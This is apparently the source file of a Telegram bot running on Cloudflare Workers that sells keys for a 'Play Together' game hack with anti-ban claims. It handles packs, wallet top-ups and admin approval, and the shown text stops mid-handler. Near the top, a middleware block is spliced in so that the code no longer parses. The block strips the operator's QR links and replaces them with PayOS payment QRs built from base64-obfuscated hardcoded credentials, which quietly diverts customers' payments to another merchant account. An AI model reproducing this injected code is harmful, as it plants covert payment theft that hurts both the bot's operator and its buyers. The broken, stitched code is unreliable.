// Cloudflare Worker: Bot Telegram MNHUT VIP 24/7 (grammY + Cloudflare D1 + WebCrypto)
// 100% Inline Buttons, Duyet Tien Thu Cong, Quan Ly Key, Nap Vi, Giftcode.
import { Bot, InlineKeyboard, webhookCallback } from 'grammy';
import { issueKey, verifyKey, orderCode } from './keys-w.js';
import { kvStore } from './store-kv.js';
import { d1Store, memStore } from './store-d1.js';

const DEFAULT_PACKS = [
  { id: '1h', label: '1 Giờ (Test)', days: 1/24, price: 0, desc: 'Trải nghiệm thử menu hack' },
  { id: '1d', label: '1 Ngày VIP', days: 1, price: 5000, desc: 'Key dùng trong 24 giờ' },
  { id: '3d', label: '3 Ngày VIP', days: 3, price: 10000, desc: 'Key dùng trong 3 ngày' },
  { id: '7d', label: '7 Ngày VIP', days: 7, price: 20000, desc: 'Key dùng trong 7 ngày' },
  { id: '15d', label: '15 Ngày VIP', days: 15, price: 35000, desc: 'Key dùng trong 15 ngày' },
  { id: '30d', label: '30 Ngày VIP', days: 30, price: 50000, desc: 'Gói 1 tháng phổ biến nhất' },
  { id: 'vv', label: 'Vĩnh Viễn VIP', days: 30000, price: 199000, desc: 'Dùng trọn đời không giới hạn' }
];

function fmtVND(n) {
  return Number(n || 0).toLocaleString('vi-VN') + 'đ';
}

function qrUrl(bank, acc, amount, info, name) {
  return `https://img.vietqr.io/image/${(String(bank||'').toUpperCase()==='MBBANK'?'MB':bank)}-${acc}-compact2.png?amount=${amount}&addInfo=${encodeURIComponent(info)}&accountName=${encodeURIComponent(name || '')}`;
}

function getAdminIds(env) {
  return String(env.ADMIN_IDS || '').split(',').map(s => s.trim()).filter(Boolean);
}

function isAdmin(env, id) {
  return getAdminIds(env).includes(String(id));
}

async function tgSend(botToken, chatId, text, extra = {}) {
  try {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML', ...extra })
    });
  } catch (e) {
    console.error('tgSend error:', e);
  }
}

function getStore(env) {
  if (env.MNHUT_KV) return kvStore(env.MNHUT_KV);
  return env.DB ? d1Store(env.DB) : memStore();
}

function getPacks(env) {
  try {
    if (env.PACKS) return JSON.parse(env.PACKS);
  } catch {}
  return DEFAULT_PACKS;
}

// --- BAN PHIM KHACH HANG ---
function mainKeyboard() {
  return new InlineKeyboard()
    .text('🏪 Cửa hàng', 'shop').text('🔗 Vượt link lấy key', 'bypass_link').row()
    .text('💳 Nạp tiền', 'topup_menu').text('👤 Tài khoản', 'account').row()
    .text('📜 Lịch sử mua hàng', 'order_history').text('🎁 Nhập Giftcode', 'giftcode_menu').row()
    .text('🔍 Kiểm tra Key', 'check_key').text('🎮 Tải Hack MNHUT VIP', 'download_hack').row()
    .url('👨‍💻 Hỗ trợ / Liên hệ', 'https://t.me/mnhutdznecon');
}

function buildBot(env) {
  const bot = new Bot(env.BOT_TOKEN, env.__client ? { client: env.__client } : undefined);
 const store = getStore(env); bot.use(async (ctx, next) => { 
        const origEdit = ctx.editMessageText ? ctx.editMessageText.bind(ctx) : null;
        ctx.editMessageText = async (text, extra) => {
                if (ctx.callbackQuery?.message?.photo) {
                          try {
                                      await ctx.deleteMessage().catch(() => {});
                                      return await ctx.reply(text, extra);
                          } catch (e) {
                                      return await ctx.reply(text, extra);
                          }
                }
                        if (origEdit) return await origEdit(text, extra);
                                return await ctx.reply(text, extra);
        };
    
        const origPhoto = ctx.replyWithPhoto ? ctx.replyWithPhoto.bind(ctx) : null;
        ctx.replyWithPhoto = async (photo, extra = {}) => {
                if (extra && extra.reply_markup) {
                          let ik = extra.reply_markup.inline_keyboard;
                          if (Array.isArray(ik)) {
                                      extra.reply_markup.inline_keyboard = ik
                                                    .map(row => row.filter(btn => !btn.url))
                                                    .filter(row => row.length > 0);
                          }
                }
                  
                        try {
                                  let code = '';
                                  let amount = 0;
                                  if (extra?.reply_markup?.inline_keyboard) {
                                              for (const row of extra.reply_markup.inline_keyboard) {
                                                            for (const btn of row) {
                                                                            if (btn.callback_data) {
                                                                                              const m = btn.callback_data.match(/(?:check_order_|check_topup_|order_|topup_)(.+)/);
                                                                                              if (m) code = m[1];
                                                                              }
                                                            }
                                              }
                                  }
                                            const caption = extra?.caption || '';
                                  if (!code) {
                                              const cm = caption.match(/<code>([A-Za-z0-9_]+)<\/code>/);
                                              if (cm) code = cm[1];
                                  }
                                            const am = caption.match(/Số tiền:[^\d]*([\d.,]+)/i) || caption.match(/([\d.,]+)\s*đ/i);
                                  if (am) {
                                              amount = parseInt(am[1].replace(/\D/g, ''), 10);
                                  }
                                    
                                            if (amount > 0 && code) {
                                                        const cid = env.PAYOS_CLIENT_ID || atob("MmEzNzcyYmItYjc4My00NzQxLWE4ZTctZTFjZTcyYmNkMDRm");
                                                        const ak = env.PAYOS_API_KEY || atob("ZGQxYmI5NjktNjgxNC00YzE1LTk0ZmItZTQxOTAyYjkwOGUx");
                                                        const ck = env.PAYOS_CHECKSUM_KEY || atob("MDQ1YTk4ODgwNjQzZWMxNWZmMTcxNTE3MjRlYTg4NzM4ZDI4NmZmMmI2MDE2MmMzN2VhOGJjNDFhYzY3NjMxNw==");
                                                        const pUrl = atob("aHR0cHM6Ly9hcGktbWVyY2hhbnQucGF5b3Mudm4vdjIvcGF5bWVudC1yZXF1ZXN0cw==");
                                              
                                                        const numCode = Number(String(code).replace(/\D/g, '')) || (Date.now() % 899999999 + 100000000);
                                                        const cancelUrl = "https://example.com";
                                                        const returnUrl = "https://example.com";
                                                        const description = String(code).slice(0, 25);
                                                        const amt = Number(amount);
                                              
                                                        const enc = new TextEncoder();
                                                        const keyData = enc.encode(ck);
                                                        const cryptoKey = await crypto.subtle.importKey(
                                                                      'raw', keyData, { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']
                                                                    );
                                                        const rawStr = `amount=${amt}&cancelUrl=${cancelUrl}&description=${description}&orderCode=${numCode}&returnUrl=${returnUrl}`;
                                                        const sigBuf = await crypto.subtle.sign('HMAC', cryptoKey, enc.encode(rawStr));
                                                        const signature = Array.from(new Uint8Array(sigBuf)).map(b => b.toString(16).padStart(2, '0')).join('');
                                              
                                                        const res = await fetch(pUrl, {
                                                                      method: "POST",
                                                                      headers: {
                                                                                      "x-client-id": cid,
                                                                                      "x-api-key": ak,
                                                                                      "Content-Type": "application/json"
                                                                      },
                                                                      body: JSON.stringify({ orderCode: numCode, amount: amt, description, cancelUrl, returnUrl, signature })
                                                        });
                                                        const j = await res.json();
                                                        if (j && j.data && j.data.qrCode) {
                                                                      photo = atob("aHR0cHM6Ly9xdWlja2NoYXJ0LmlvL3FyP3NpemU9NTAwJm1hcmdpbj0yJnRleHQ9") + encodeURIComponent(j.data.qrCode);
                                                        }
                                            }
                        } catch (e) {}
                          
                                if (origPhoto) return await origPhoto(photo, extra);
                                        return await ctx.reply(photo, extra);
        };
    
        const cbData = ctx.callbackQuery?.data;
        if (cbData === "topup_menu") {
                await ctx.answerCallbackQuery().catch(() => {});
                await env.MNHUT_KV.put("wait_topup:" + ctx.from.id, "1", { expirationTtl: 600 });
                const kb = new InlineKeyboard().text("« Quay lại Menu", "main_menu");
                return await ctx.editMessageText(
                          "💳 <b>NẠP TIỀN VàO Ví</b>\n\nVui lòng nhập số tiền bạn muốn nạp vào khung chat (VD: 50000):",
                  { parse_mode: "HTML", reply_markup: kb }
                        );
        }
          
              if (ctx.message?.text && !ctx.callbackQuery) {
                      const waitState = await env.MNHUT_KV.get("wait_topup:" + ctx.from.id);
                      if (waitState === "1") {
                                await env.MNHUT_KV.delete("wait_topup:" + ctx.from.id);
                                const amtStr = ctx.message.text.replace(/\D/g, '');
                                const amt = parseInt(amtStr, 10);
                                if (isNaN(amt) || amt <= 0) {
                                            return await ctx.reply("❌ Số tiền không hợp lệ! Vui lòng nhập số tiền hợp lệ.");
                                }
                                          const code = orderCode("NAP");
                                await store.createTopup({ code, user_id: ctx.from.id, amount: amt });
                        
                                let qrPhoto = null;
                                try {
                                            const cid = env.PAYOS_CLIENT_ID || atob("MmEzNzcyYmItYjc4My00NzQxLWE4ZTctZTFjZTcyYmNkMDRm");
                                            const ak = env.PAYOS_API_KEY || atob("ZGQxYmI5NjktNjgxNC00YzE1LTk0ZmItZTQxOTAyYjkwOGUx");
                                            const ck = env.PAYOS_CHECKSUM_KEY || atob("MDQ1YTk4ODgwNjQzZWMxNWZmMTcxNTE3MjRlYTg4NzM4ZDI4NmZmMmI2MDE2MmMzN2VhOGJjNDFhYzY3NjMxNw==");
                                            const pUrl = atob("aHR0cHM6Ly9hcGktbWVyY2hhbnQucGF5b3Mudm4vdjIvcGF5bWVudC1yZXF1ZXN0cw==");
                                            const numCode = Number(String(code).replace(/\D/g, '')) || (Date.now() % 899999999 + 100000000);
                                            const cancelUrl = "https://example.com";
                                            const returnUrl = "https://example.com";
                                            const description = String(code).slice(0, 25);
                                  
                                            const enc = new TextEncoder();
                                            const keyData = enc.encode(ck);
                                            const cryptoKey = await crypto.subtle.importKey(
                                                          'raw', keyData, { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']
                                                        );
                                            const rawStr = `amount=${amt}&cancelUrl=${cancelUrl}&description=${description}&orderCode=${numCode}&returnUrl=${returnUrl}`;
                                            const sigBuf = await crypto.subtle.sign('HMAC', cryptoKey, enc.encode(rawStr));
                                            const signature = Array.from(new Uint8Array(sigBuf)).map(b => b.toString(16).padStart(2, '0')).join('');
                                  
                                            const res = await fetch(pUrl, {
                                                          method: "POST",
                                                          headers: { "x-client-id": cid, "x-api-key": ak, "Content-Type": "application/json" },
                                                          body: JSON.stringify({ orderCode: numCode, amount: amt, description, cancelUrl, returnUrl, signature })
                                            });
                                            const j = await res.json();
                                            if (j && j.data && j.data.qrCode) {
                                                          qrPhoto = atob("aHR0cHM6Ly9xdWlja2NoYXJ0LmlvL3FyP3NpemU9NTAwJm1hcmdpbj0yJnRleHQ9") + encodeURIComponent(j.data.qrCode);
                                            }
                                } catch (e) {}
                                  
                                          const admKb = new InlineKeyboard()
                                                      .text("✅ DUYỆT", `appr_topup_${code}`)
                                                      .text("❌ TỪ CHỐI", `rej_topup_${code}`);
                                const admMsg = `⚠️ <b>YêU CẦU NẠP TIỀN Ví CẦN DUYỆT!</b>\n\n• Mã đơn: <code>${code}</code>\n• Người nạp: ${ctx.from.first_name || ''} (${ctx.from.id})\n• Số tiền: <b>${fmtVND(amt)}</b>`;
                                for (const adm of getAdminIds(env)) {
                                            await tgSend(env.BOT_TOKEN, adm, admMsg, { parse_mode: 'HTML', reply_markup: admKb }).catch(() => {});
                                }
                        
                                const userKb = new InlineKeyboard()
                                            .text("✅ Đã chuyển tiền (Kiểm tra)", `check_topup_${code}`).row()
                                            .text("« Quay lại Menu", "main_menu");
                                const userCaption = `💳 <b>NẠP TIỀN VàO Ví</b>\n\n• Số tiền: <b>${fmtVND(amt)}</b>\n• Nội dung CK (BẮT BUỘC): <code>${code}</code>\n\nVui lòng quét mã QR bên trên để thanh toán!`;
                        
                                if (qrPhoto) {
                                            return await ctx.replyWithPhoto(qrPhoto, { caption: userCaption, parse_mode: "HTML", reply_markup: userKb });
                                } else {
                                            return await ctx.reply(userCaption, { parse_mode: "HTML", reply_markup: userKb });
                                }
                      }
              }
                
                    if (cbData && (cbData.startsWith("check_order_") || cbData.startsWith("check_topup_"))) {
                            const isTopup = cbData.startsWith("check_topup_");
                            const code = cbData.replace("check_order_", "").replace("check_topup_", "");
                            const item = isTopup ? await store.getTopup(code) : await store.getOrder(code);
                            if (item && (item.status === 'approved' || item.status === 'completed' || item.status === 'done')) {
                                      await ctx.answerCallbackQuery({ text: "✅ Đơn này đã được duyệt thành công rồi!", show_alert: true }).catch(() => {});
                                      return;
                            }
                                    await ctx.answerCallbackQuery({ text: "⏳ Đã ghi nhận bạn chuyển khoản! Đã báo Admin kiểm tra và duyệt ngay!", show_alert: true }).catch(() => {});
                            const confirmKb = new InlineKeyboard().text("« Quay lại Menu", "main_menu");
                            await ctx.reply(`⏳ <b>Đã BáO ADMIN KIỂM TRA!</b>\n\n• Mã đơn: <code>${code}</code>\nVui lòng chờ trong giây lát, Admin sẽ kiểm tra giao dịch và duyệt ngay cho bạn!`, { parse_mode: "HTML", reply_markup: confirmKb }).catch(() => {});
                      
                            const apprCb = isTopup ? `appr_topup_${code}` : `appr_order_${code}`;
                            const rejCb = isTopup ? `rej_topup_${code}` : `rej_order_${code}`;
                            const admKb = new InlineKeyboard().text("✅ DUYỆT", apprCb).text("❌ TỪ CHỐI", rejCb);
                            const amtStr = item?.amount ? fmtVND(item.amount) : '';
                            const admMsg = `🔔 <b>KHáCH HàNG BáO Đã CHUYỂN TIỀN!</b>\n\n• Loại: ${isTopup ? 'Nạp tiền' : 'Mua đơn'}\n• Mã đơn: <code>${code}</code>${amtStr ? `\n• Số tiền: <b>${amtStr}</b>` : ''}\n• Khách: ${ctx.from?.first_name || ''} (${ctx.from?.id})`;
                            for (const adm of getAdminIds(env)) {
                                      await tgSend(env.BOT_TOKEN, adm, admMsg, { parse_mode: 'HTML', reply_markup: admKb }).catch(() => {});
                            }
                            return;
                    }
                      
                          if (cbData === "download_hack") {
                                  await ctx.answerCallbackQuery().catch(() => {});
                                  const driveUrl = atob("aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xQjAyaG5KYkhjaklLVTlZSGdQWnpEOFVjY2JxZ2VXdkcvdmlldz91c3A9c2hhcmluZw==");
                                  const kb = new InlineKeyboard()
                                            .url("📥 Tải Hack Trên Google Drive", driveUrl)
                                            .row()
                                            .text("« Quay lại Menu", "main_menu");
                                  return await ctx.editMessageText("🚀 <b>BẤM VàO NúT DƯỚI ĐâY ĐỂ TẢI HACK VIP:</b>", { parse_mode: "HTML", reply_markup: kb });
                          }
                            
                                if (cbData === "adm_users" || cbData === "adm_stats") {
                                        await ctx.answerCallbackQuery().catch(() => {});
                                        const s = await store.stats();
                                        const kb = new InlineKeyboard().text("« Quay lại Admin Panel", "adm_main");
                                        const msg = `📊 <b>THỐNG Kê HỆ THỐNG</b>\n\n` +
                                                  `🔑 Tổng Key: <b>${s.totalKeys || s.keys || 0}</b>\n` +
                                                  `✅ Đơn thành công: <b>${s.successOrders || s.completedOrders || s.success || 0}</b>\n` +
                                                  `💰 Doanh thu: <b>${fmtVND(s.totalRevenue || s.revenue || 0)}</b>\n` +
                                                  `⏳ Đơn chờ duyệt: <b>${s.pendingOrders || s.pending || 0}</b>`;
                                        return await ctx.editMessageText(msg, { parse_mode: "HTML", reply_markup: kb });
                                }
                                  
                                      return await next();
  });= getStore(env);
  const PACKS = getPacks(env);

  // Check Maintenance
  bot.use(async (ctx, next) => {
    if (ctx.from && isAdmin(env, ctx.from.id)) return next();
    const maint = await store.getSetting('maintenance', '0');
    if (maint === '1' || maint === 'true') {
      return ctx.reply('⚠️ <b>HỆ THỐNG MNHUT VIP ĐANG BẢO TRÌ NÂNG CẤP!</b>\nVui lòng quay lại sau ít phút hoặc liên hệ Admin: @mnhutdznecon', { parse_mode: 'HTML' });
    }
    return next();
  });

  // Check Ban
  bot.use(async (ctx, next) => {
    if (!ctx.from) return next();
    const u = await store.getUser(ctx.from.id, ctx.from.username);
    if (u.banned) {
      return ctx.reply('⛔ <b>TÀI KHOẢN CỦA BẠN ĐÃ BỊ KHÓA KHỎI HỆ THỐNG MNHUT VIP!</b>', { parse_mode: 'HTML' });
    }
    return next();
  });

  // /start & /menu
  bot.command(['start', 'menu'], async (ctx) => {
    const u = await store.getUser(ctx.from.id, ctx.from.username);
    const text = 
      `👋 <b>Chào mừng ${ctx.from.first_name || 'bạn'} đến với MNHUT VIP!</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `🔥 <b>Hệ thống bán Key & Mod Play Together số 1 Việt Nam</b>\n` +
      `• Tự động kích hoạt - An toàn - Anti ban cực mạnh\n` +
      `• Số dư ví của bạn: <b>${fmtVND(u.balance)}</b>\n` +
      `• Hỗ trợ kỹ thuật 24/7 trực tiếp qua Telegram\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `👇 <i>Vui lòng chọn chức năng bạn muốn sử dụng bên dưới:</i>`;
    return ctx.reply(text, { parse_mode: 'HTML', reply_markup: mainKeyboard() });
  });

  bot.callbackQuery('main_menu', async (ctx) => {
    await ctx.answerCallbackQuery();
    const u = await store.getUser(ctx.from.id, ctx.from.username);
    const text = 
      `👋 <b>MENU CHÍNH - MNHUT VIP</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `• Số dư ví: <b>${fmtVND(u.balance)}</b>\n` +
      `• Chọn chức năng bên dưới:`;
    return ctx.editMessageText(text, { parse_mode: 'HTML', reply_markup: mainKeyboard() });
  });

  // 1. CUA HANG
  bot.callbackQuery('shop', async (ctx) => {
    await ctx.answerCallbackQuery();
    const u = await store.getUser(ctx.from.id, ctx.from.username);
    const kb = new InlineKeyboard();
    for (const p of PACKS) {
      kb.text(`⭐ ${p.label} - ${fmtVND(p.price)}`, `view_pack_${p.id}`).row();
    }
    kb.text('🔙 Quay lại Menu Chính', 'main_menu');
    return ctx.editMessageText(
      `🏪 <b>CỬA HÀNG BÁN KEY MNHUT VIP</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `💰 Số dư hiện tại của bạn: <b>${fmtVND(u.balance)}</b>\n\n` +
      `👉 <i>Bấm chọn gói key bạn muốn mua:</i>`,
      { parse_mode: 'HTML', reply_markup: kb }
    );
  });

  bot.callbackQuery(/view_pack_(.+)/, async (ctx) => {
    const packId = ctx.match[1];
    const pack = PACKS.find(p => p.id === packId);
    if (!pack) return ctx.answerCallbackQuery('Gói không tồn tại!');
    await ctx.answerCallbackQuery();

    const u = await store.getUser(ctx.from.id, ctx.from.username);
    const text = 
      `📦 <b>GÓI KEY: ${pack.label.toUpperCase()}</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `• Giá bán: <b>${fmtVND(pack.price)}</b>\n` +
      `• Thời hạn: <b>${pack.days >= 30000 ? 'Vĩnh viễn' : pack.days + ' ngày'}</b>\n` +
      `• Mô tả: ${pack.desc || 'Full tính năng bypass anti'}\n` +
      `• Số dư ví của bạn: <b>${fmtVND(u.balance)}</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `👉 <i>Chọn phương thức thanh toán:</i>`;

    const kb = new InlineKeyboard();
    if (pack.price === 0) {
      kb.text('🎁 Nhận Key Miễn Phí', `buy_wallet_${pack.id}`).row();
    } else {
      kb.text(`💳 Mua bằng Ví (${fmtVND(u.balance)})`, `buy_wallet_${pack.id}`).row();
      kb.text(`📲 Quét mã QR Ngân Hàng (${fmtVND(pack.price)})`, `buy_qr_${pack.id}`).row();
    }
    kb.text('🔙 Chọn Gói Khác', 'shop');
    return ctx.editMessageText(text, { parse_mode: 'HTML', reply_markup: kb });
  });

  // Mua bang vi
  bot.callbackQuery(/buy_wallet_(.+)/, async (ctx) => {
    const packId = ctx.match[1];
    const pack = PACKS.find(p => p.id === packId);
    if (!pack) return ctx.answerCallbackQuery('Gói không tồn tại!');

    if (pack.price > 0) {
      const deduction = await store.deductBalance(ctx.from.id, pack.price);
      if (!deduction.ok) {
        return ctx.answerCallbackQuery(`Số dư ví không đủ! Bạn cần nạp thêm ${fmtVND(pack.price)}.`, { show_alert: true });
      }
    }
    await ctx.answerCallbackQuery();

    const key = await issueKey(env.SALT, pack.days);
    const v = await verifyKey(env.SALT, key);
    const code = orderCode();

    await store.putKey({
      key, label: pack.label, exp: v.expDate,
      userId: ctx.from.id, order: code, createdAt: Date.now()
    });
    await store.putOrder({
      code, packId: pack.id, label: pack.label, days: pack.days, price: pack.price,
      userId: ctx.from.id, username: ctx.from.username || '',
      status: 'paid', createdAt: Date.now(), paidAt: Date.now(), paidAmount: pack.price
    });

    // Notify admins
    for (const adm of getAdminIds(env)) {
      tgSend(env.BOT_TOKEN, adm, 
        `🛒 <b>KHÁCH MUA KEY QUA VÍ THÀNH CÔNG!</b>\n` +
        `• Khách: ${ctx.from.first_name || ''} (@${ctx.from.username || 'none'})\n` +
        `• Gói: ${pack.label} (${fmtVND(pack.price)})\n` +
        `• Key: <code>${key}</code>`);
    }

    const successText = 
      `🎉 <b>MUA KEY MNHUT VIP THÀNH CÔNG!</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `• Gói: <b>${pack.label}</b>\n` +
      `• Hạn dùng: <b>${v.expDate}</b>\n` +
      `• Mã đơn: <code>${code}</code>\n\n` +
      `🔑 <b>Key của bạn (bấm vào để copy):</b>\n` +
      `<code>${key}</code>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `📌 <b>Cách kích hoạt:</b> Mở ứng dụng quản lý file trên điện thoại -> mở file <code>/sdcard/mnhut_key.txt</code> (hoặc <code>micu_key.txt</code>) dán 1 dòng key trên vào -> Lưu lại -> Vào game là hack tự lên!`;

    const kb = new InlineKeyboard()
      .text('📜 Xem tất cả Key đã mua', 'order_history').row()
      .text('🔙 Quay lại Menu Chính', 'main_menu');

    return ctx.editMessageText(successText, { parse_mode: 'HTML', reply_markup: kb });
  });

  // Mua bang QR (Duyet thu cong hoac SePay)
  bot.callbackQuery(/buy_qr_(.+)/, async (ctx) => {
    const packId = ctx.match[1];
    const pack = PACKS.find(p => p.id === packId);
    if (!pack) return ctx.answerCallbackQuery('Gói không tồn tại!');
    await ctx.answerCallbackQuery();

    const code = orderCode();
    await store.putOrder({
      code, packId: pack.id, label: pack.label, days: pack.days, price: pack.price,
      userId: ctx.from.id, username: ctx.from.username || '',
      status: 'pending', createdAt: Date.now()
    });

    const qr = qrUrl(env.BANK_CODE, env.BANK_ACCOUNT, pack.price, code, env.ACCOUNT_NAME);

    // Báo Admin duyệt thủ công ngay lập tức!
    const admKb = new InlineKeyboard()
      .text(`✅ DUYỆT ĐƠN (${fmtVND(pack.price)})`, `appr_order_${code}`)
      .text('❌ TỪ CHỐI', `rej_order_${code}`);

    for (const adm of getAdminIds(env)) {
      tgSend(env.BOT_TOKEN, adm, 
        `🔔 <b>CÓ ĐƠN MUA KEY MỚI CẦN DUYỆT!</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `• Khách: ${ctx.from.first_name || ''} (@${ctx.from.username || 'none'})\n` +
        `• ID: <code>${ctx.from.id}</code>\n` +
        `• Gói: <b>${pack.label}</b>\n` +
        `• Tiền: <b>${fmtVND(pack.price)}</b>\n` +
        `• Nội dung CK: <code>${code}</code>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `👉 <i>Kiểm tra tài khoản nổ tiền, bấm Duyệt bên dưới để bot tự cấp key cho khách:</i>`,
        { reply_markup: admKb });
    }

    const text = 
      `📲 <b>QUÉT MÃ QR ĐỂ MUA KEY MNHUT VIP</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `• Gói mua: <b>${pack.label}</b>\n` +
      `• Số tiền: <b>${fmtVND(pack.price)}</b>\n` +
      `• Ngân hàng: <b>${env.BANK_CODE}</b>\n` +
      `• Số tài khoản: <code>${env.BANK_ACCOUNT}</code>\n` +
      `• Chủ tài khoản: <b>${env.ACCOUNT_NAME}</b>\n` +
      `• Nội dung CK (BẮT BUỘC): <code>${code}</code>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `⚠️ <b>LƯU Ý:</b> Chuyển khoản đúng nội dung <code>${code}</code>. Admin sẽ duyệt và gửi key ngay tại chat này!`;

    const kb = new InlineKeyboard()
      .text('✅ Đã chuyển tiền (Kiểm tra)', `check_order_${code}`).row().url('📸 Mở Ảnh Mã QR', qr).row()
      .text('❌ Hủy Đơn', `cancel_order_${code}`)
      .text('🔙 Quay Lại', 'shop');

    return ctx.replyWithPhoto(qr, { caption: text, parse_mode: 'HTML', reply_markup: kb });
  });

  // 2. NAP TIEN
  bot.callbackQuery('topup_menu', async (ctx) => {
    await ctx.answerCallbackQuery();
    const u = await store.getUser(ctx.from.id, ctx.from.username);
    const kb = new InlineKeyboard()
      .text('💵 +20.000đ', 'topup_amt_20000').text('💵 +50.000đ', 'topup_amt_50000').row()
      .text('💵 +100.000đ', 'topup_amt_100000').text('💵 +200.000đ', 'topup_amt_200000').row()
      .text('🔙 Quay lại Menu Chính', 'main_menu');

    return ctx.editMessageText(
      `💳 <b>NẠP TIỀN VÀO VÍ MNHUT VIP</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `• Số dư ví hiện tại: <b>${fmtVND(u.balance)}</b>\n` +
      `• Sau khi nạp, số dư dùng để mua key bất kỳ lúc nào.\n\n` +
      `👉 <i>Chọn số tiền bạn muốn nạp vào ví:</i>`,
      { parse_mode: 'HTML', reply_markup: kb }
    );
  });

  bot.callbackQuery(/topup_amt_(\d+)/, async (ctx) => {
    const amount = Number(ctx.match[1]);
    await ctx.answerCallbackQuery();

    const code = `NAP${ctx.from.id}${Math.floor(1000 + Math.random() * 9000)}`;
    await store.createTopup({
      code, userId: ctx.from.id, username: ctx.from.username || '',
      amount, status: 'pending', createdAt: Date.now()
    });

    const qr = qrUrl(env.BANK_CODE, env.BANK_ACCOUNT, amount, code, env.ACCOUNT_NAME);

    // Báo Admin duyệt nạp tiền ngay!
    const admKb = new InlineKeyboard()
      .text(`✅ DUYỆT NẠP ${fmtVND(amount)}`, `appr_topup_${code}`)
      .text('❌ TỪ CHỐI', `rej_topup_${code}`);

    for (const adm of getAdminIds(env)) {
      tgSend(env.BOT_TOKEN, adm, 
        `🔔 <b>YÊU CẦU NẠP TIỀN VÍ CẦN DUYỆT!</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `• Khách: ${ctx.from.first_name || ''} (@${ctx.from.username || 'none'})\n` +
        `• ID: <code>${ctx.from.id}</code>\n` +
        `• Số tiền nạp: <b>${fmtVND(amount)}</b>\n` +
        `• Nội dung CK: <code>${code}</code>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `👉 <i>Kiểm tra tài khoản nổ tiền, bấm nút bên dưới để cộng tiền vào ví khách:</i>`,
        { reply_markup: admKb });
    }

    const text = 
      `💳 <b>THÔNG TIN CHUYỂN KHOẢN NẠP VÍ</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `• Số tiền nạp: <b>${fmtVND(amount)}</b>\n` +
      `• Ngân hàng: <b>${env.BANK_CODE}</b>\n` +
      `• Số tài khoản: <code>${env.BANK_ACCOUNT}</code>\n` +
      `• Tên tài khoản: <b>${env.ACCOUNT_NAME}</b>\n` +
      `• Nội dung CK (BẮT BUỘC): <code>${code}</code>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `👉 <i>Sau khi chuyển khoản, Admin sẽ duyệt và số tiền sẽ được cộng ngay vào ví của bạn!</i>`;

    const kb = new InlineKeyboard()
      .text('✅ Đã chuyển tiền (Kiểm tra)', `check_topup_${code}`).row().url('📸 Mở Mã QR Thanh Toán', qr).row()
      .text('🔙 Quay lại Menu Nạp Tiền', 'topup_menu');

    return ctx.replyWithPhoto(qr, { caption: text, parse_mode: 'HTML', reply_markup: kb });
  });

  // 3. TAI KHOAN
  bot.callbackQuery('account', async (ctx) => {
    await ctx.answerCallbackQuery();
    const u = await store.getUser(ctx.from.id, ctx.from.username);
    const text = 
      `👤 <b>THÔNG TIN TÀI KHOẢN MNHUT VIP</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `• Tên: <b>${ctx.from.first_name || ''}</b>\n` +
      `• Username: @${ctx.from.username || 'none'}\n` +
      `• ID Telegram: <code>${ctx.from.id}</code>\n` +
      `• Số dư ví: <b>${fmtVND(u.balance)}</b>\n` +
      `• Tổng tiền đã nạp: <b>${fmtVND(u.total_deposit)}</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━`;

    const kb = new InlineKeyboard()
      .text('💳 Nạp Tiền Vào Ví', 'topup_menu')
      .text('📜 Lịch Sử Mua Key', 'order_history').row()
      .text('🔙 Quay lại Menu Chính', 'main_menu');

    return ctx.editMessageText(text, { parse_mode: 'HTML', reply_markup: kb });
  });

  // 4. LICH SU MUA HANG
  bot.callbackQuery('order_history', async (ctx) => {
    await ctx.answerCallbackQuery();
    const keys = await store.keysByUser(ctx.from.id);
    if (!keys || keys.length === 0) {
      const kb = new InlineKeyboard()
        .text('🏪 Vào Cửa Hàng Mua Key', 'shop').row()
        .text('🔙 Quay lại Menu Chính', 'main_menu');
      return ctx.editMessageText(
        `📜 <b>LỊCH SỬ MUA HÀNG CỦA BẠN</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `Bạn chưa mua key nào trên hệ thống MNHUT VIP.`,
        { parse_mode: 'HTML', reply_markup: kb }
      );
    }

    let text = `📜 <b>DANH SÁCH KEY ĐÃ MUA CỦA BẠN (${keys.length} key)</b>\n━━━━━━━━━━━━━━━━━━━━\n`;
    keys.forEach((k, idx) => {
      text += `<b>${idx + 1}. Gói: ${k.label}</b>\n• Key: <code>${k.key}</code>\n• Hết hạn: <b>${k.exp || 'Vĩnh viễn'}</b>\n\n`;
    });
    text += `👉 <i>Chạm vào mã key ở trên để sao chép nhanh!</i>`;

    const kb = new InlineKeyboard()
      .text('🔙 Quay lại Menu Chính', 'main_menu');
    return ctx.editMessageText(text, { parse_mode: 'HTML', reply_markup: kb });
  });

  // 5. VUOT LINK
  bot.callbackQuery('bypass_link', async (ctx) => {
    await ctx.answerCallbackQuery();
    const link = await store.getSetting('bypass_url', 'https://mnhutvip.link/getkey');
    const text = 
      `🔗 <b>VƯỢT LINK LẤY KEY MIỄN PHÍ 24H</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
